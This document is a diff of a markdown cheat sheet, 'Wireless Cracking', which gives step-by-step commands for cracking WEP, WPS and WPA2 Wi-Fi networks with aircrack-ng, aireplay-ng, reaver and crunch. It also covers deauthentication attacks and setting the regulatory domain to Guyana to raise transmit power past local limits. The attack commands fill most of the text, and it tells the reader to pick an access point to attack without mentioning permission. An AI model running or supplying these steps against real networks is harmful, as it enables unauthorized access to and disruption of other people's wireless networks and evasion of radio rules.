@@ -1,45 +1,44 @@
-Wireless Cracking
-Version 20170912.2
+Instructions
+=
 
-
-
-
+Wireless Cracking    
+*Version 20171003.1*
 
 CONTENTS
-Introduction.
-Terms
-Change WiFi adapter output power.
-Information gathering.
-WEP cracking.
-WPS cracking.
-WPA2 cracking.
-Deauthorization Attack.
-Troubleshooting.
+=
+ - Introduction.
+ - Terms
+ - Change WiFi adapter output power.
+ - Information gathering.
+ - WEP cracking.
+ - WPS cracking.
+ - WPA2 cracking.
+ - Deauthorization Attack.
+ - Troubleshooting.
 
 
+Introduction
+=
+Wireless auditing is fairly easy and straight forward. When put into monitoring mode some wireless adapters enumerate with different names. "wlan0" and "wlan0mon" are common interface names though you may also see "wlan3" or "wlan2mon". The name will be displayed by "airodump-ng" after the command is run.  This guide is written 
 
 
+**Example**    
 
-######Introduction######
-Wireless auditing is fairly easy and straight forward. When put into monitoring mode some wireless adapters enumerate with different names. 
-"wlan0" and "wlan0mon" are common interface names though you may also see "wlan3" or "wlan2mon". The name will be displayed by "airodump-ng" after the command is run.  This guide is written 
-
-@@@@@EXAMPLE@@@@@
-~# airmon-ng start wlan0
-
-PHY	Interface	Driver		Chipset
-
-phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
+   ~# airmon-ng start wlan0
+    
+    PHY	Interface	Driver		Chipset
+     
+    phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
+    
 		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
-		(mac80211 station mode vif disabled for [phy0]wlan0)
-@@@@@EXAMPLE@@@@@
+		(mac80211 station mode vif disabled for [phy0]wlan0)    
+
+**Example**
 
 
 
-
-
-
-#####Terms#####
+Terms
+=
 
 Adapter
 BSSID
@@ -51,124 +50,142 @@ DBM
 
 
 
+Change adapter transmit power
+=
+ - Logically disconnect the wireless adapter so changes can be made to it's configuration    
+>ifconfig wlan0 down
 
-######Change adapter transmit power#####
+ - Change regulatory cap setting to Guyana where 30DBM is legal    
+>iw reg set GY 
 
-#Logically disconnect the wireless adapter so changes can be made to it's configuration
-ifconfig wlan0 down
+ - Change output setting to 30DBM    
+>iwconfig wlan0 txpower 30 
 
-#Change regulatory cap setting to Guyana where 30DBM is legal
-iw reg set GY 
-
-#Change output setting to 30DBM
-iwconfig wlan0 txpower 30 
-
-#Logically reconnect the wireless adapter for use
-ifconfig wlan0 up 
-
-
-
-
-
-#####Information gathering#####
-#Make sure all wireless adapters are connected and visible to Kali.
-iwconfig 
-
-#Kill processes which can interfer with required changes.
-airmon-ng check kill
-
-#Put your wireless adapter into monitor mode so that it can see all traffic broadcast.
-airmon-ng start wlan0
-
-#Confirm your adapter is in monitor mode.
-iwconfig 
-
-#Your wireless adapter should show it is in monitor mode.
- wlan0      IEEE 802.11g  ESSID:""  Nickname:""
-        Mode:Monitor  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82   
-
-#List wireless networks within rx range.  
-#Looks for all wireless encryption types on both 2ghz and 5ghz.
-airodump-ng wlan0mon --band abg
-
-#Alternatively you can run the following command to get additional information.
-airodump-ng wlan0mon --manufacturer --uptime --wps --encrypt wpa2 --berlin 600 --band abg
+ - Logically reconnect the wireless adapter for use    
+>ifconfig wlan0 up 
 
 
 
 
 
-#####WEP cracking#####
-#Make sure all wireless adapters are connected and visible to Kali
-iwconfig 
+Information gathering
+=
+ - Make sure all wireless adapters are connected and visible to Kali.
+>iwconfig 
 
-#Kill processes which can interfer with required changes
-airmon-ng check kill
+ - Kill processes which can interfer with required changes.
+>airmon-ng check kill
 
-#Put your wireless adapter into monitor mode so that it can see all traffic broadcast
-airmon-ng start wlan0
+ - Put your wireless adapter into monitor mode so that it can see all traffic broadcast.
+>airmon-ng start wlan0
 
-#List wireless networks within rx range.  Looks for all wireless encryption types on both 2ghz and 5ghz.
-airodump-ng wlan0mon --encrypt wep --band abg
+ - Confirm your adapter is in monitor mode.
+>iwconfig 
 
-#Allow the list to accumulate a names for 2-5 minutes. Then stop the scan.
-CTRL+C
+ - Your wireless adapter should show it is in monitor mode.
+ 
+>wlan0      IEEE 802.11g  ESSID:""  Nickname:""    
+>    Mode:Monitor  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82    
 
-#Identify the access point you wish to attack.  
-#Copy it's channel, and MAC address into following command. 
-#Also create a name for the log file.
-airodump-ng -c <channel> -w <logname> --bssid <mac address> wlan0mon
+- List wireless networks within rx range. Looks for all wireless encryption types on both 2ghz and 5ghz.
+>airodump-ng wlan0mon --band abg
 
-#Allow the previous command to run and open a new terminal window. 
-#-1 means fake authentication.
-#0 reassociation timing in seconds.
-#-a <mac address> is the access point MAC address.
-#wlan0mon is the wireless interface name.
-aireplay-ng -1 0 -a <mac address> wlan0mon
-
-#Wait for "Association successful" message.
-#Open a new terminal window.
-#-3 means arp request replay.
-#-b <mac address> is the access point MAC address.
-#wlan0mon is the wireless interface name.
-aireplay-ng -3 -b <mac address> wlan0mon
-
-#Allow the previous command to run and open a new terminal window.
-#<logname.cap> is the file created above. 
-aircrack-ng <logname.cap>
+ - Alternatively you can run the following command to get additional information.
+>airodump-ng wlan0mon --manufacturer --uptime --wps --encrypt wpa2 --berlin 600 --band abg
 
 
 
 
-WPS
 
-iwconfig 
-*make sure all wireless adapters are connected.
-airmon-ng check kill
-*kill network mapper
-airmon-ng start wlan0
-wash -i wlan0mon -s -C  **add -5 for 5ghz**
-*another terminal 
-reaver -i wlan0mon -c <channel> -b <mac address> -vv -N -L **If it stops responding after a few mintues add the following switch "--fail-wait=360"**
-*to re-crack after password is changed**
-reaver -i (monitor interface) -b (BSSID) -c (channel) --pin=(8 digit pin) -vv
-reaver -i wlan0mon -c 2 -b C8:D7:19:0D:E3:F7 -vv -S -N -L -d 15 -r 3:15 -T .5 -x 360
+
+WEP cracking
+=
+ - Make sure all wireless adapters are connected and visible to Kali
+>iwconfig 
+
+ - Kill processes which can interfer with required changes
+>airmon-ng check kill
+
+ - Put your wireless adapter into monitor mode so that it can see all traffic broadcast
+>airmon-ng start wlan0
+
+ - List wireless networks within rx range.  Looks for all wireless encryption types on both 2ghz and 5ghz.
+>airodump-ng wlan0mon --encrypt wep --band abg
+
+ - Allow the list to accumulate a names for 2-5 minutes. Then stop the scan.
+>CTRL+C
+
+ - Identify the access point you wish to attack. Copy it's channel, and MAC address into following command. Also create a name for the log file.
+>airodump-ng -c <channel> -w <logname> --bssid <mac address> wlan0mon
+
+ - Allow the previous command to run and open a new terminal window. -1 means fake authentication. 0 means reassociation timing in seconds. -a <mac address> is the access point MAC address. wlan0mon is the wireless interface name.
+>aireplay-ng -1 0 -a <mac address> wlan0mon
+
+ - Wait for "Association successful" message. Open a new terminal window. -3 means arp request replay. -b <mac address> is the access point MAC address. wlan0mon is the wireless interface name.
+>aireplay-ng -3 -b <mac address> wlan0mon
+
+ - Allow the previous command to run and open a new terminal window. <logname.cap> is the file created above. 
+>aircrack-ng <logname.cap>
+
+
+
+
+WPS cracking
+=
+ - Make sure all wireless adapters are connected and visible to Kali
+>iwconfig 
+
+ - Kill processes which can interfer with required changes
+>airmon-ng check kill
+
+ - Put your wireless adapter into monitor mode so that it can see all traffic broadcast
+>airmon-ng start wlan0
+
+ - List wireless networks using WPS within rx range.  Looks for all wireless encryption types on both 2ghz and 5ghz. -5 adds 5Ghz channels to the scan. -s -C
+>wash -i wlan0mon -s -C -5
+
+ - Allow the list to accumulate a names for 2-5 minutes. Then stop the scan.
+>CTRL + C
+
+ - Open a second terminal so you can still see the first window. 
+>reaver -i wlan0mon -c <channel> -b <mac address> -vv -N -L 
+
+ - If the previous command stops being effective after a few minutes try the following command instead.
+>reaver -i wlan0mon -c <channel> -b <mac address> -vv -N -L --fail-wait=360
+
+ - Once the WPS key is found new passwords can be cracked much more quickly
+>reaver -i (monitor interface) -b (BSSID) -c (channel) --pin=(8 digit pin) -vv
+
+**Example**
+>reaver -i wlan0mon -c 2 -b C8:D7:19:0D:E3:F7 -vv -S -N -L -d 15 -r 3:15 -T .5 -x 360
+
 
 
 
 WPA2 cracking
+=
+ - Make sure all wireless adapters are connected and visible to Kali.
+>iwconfig 
 
-iwconfig 
-*make sure all wireless adapters are connected.
-airmon-ng check kill
-*kill network manager
-airmon-ng start wlan0
-airodump-ng wlan0mon **ADD --band abg to scan 5ghz space** 
-airodump-ng -c <channel> -w <logname> --bssid <mac address> wlan0mon 
-*another terminal
-aireplay-ng -0 0 -a <mac address> wlan0mon
-*Wait for WPA handshake.
-crunch <min key length> <max key length> abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%&* | aircrack-ng -b <mac address> -w - <log.cap>
+ - Kill processes which can interfer with required changes.
+>airmon-ng check kill
+
+ - Put your wireless adapter into monitor mode so that it can see all traffic broadcast.
+>airmon-ng start wlan0
+
+ - List wireless networks within rx range. --band abg means scan both 2.4Ghz and 5Ghz space.
+>airodump-ng wlan0mon --band abg 
+
+ - Allow the list to accumulate a names for 2-5 minutes. Then stop the scan.
+> CTRL+C
+
+ - Identify the access point you wish to attack. Copy it's channel, and MAC address into following command. Also create a name for the log file. 
+>airodump-ng -c <channel> -w <logname> --bssid <mac address> wlan0mon 
+ - Wait for "Association successful" message. Open a second terminal so you can still see the first window and run the following command. 
+>aireplay-ng -0 0 -a <mac address> wlan0mon
+
+ - 
+>crunch <min key length> <max key length> abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%&* | aircrack-ng -b <mac address> -w - <log.cap>
 
 
 
@@ -178,7 +195,7 @@ crunch <min key length> <max key length> abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLM
 
 
 Deauthorization attack
-
+=
 iwconfig 
 *make sure all wireless adapters are connected.
 airmon-ng wlan0mon
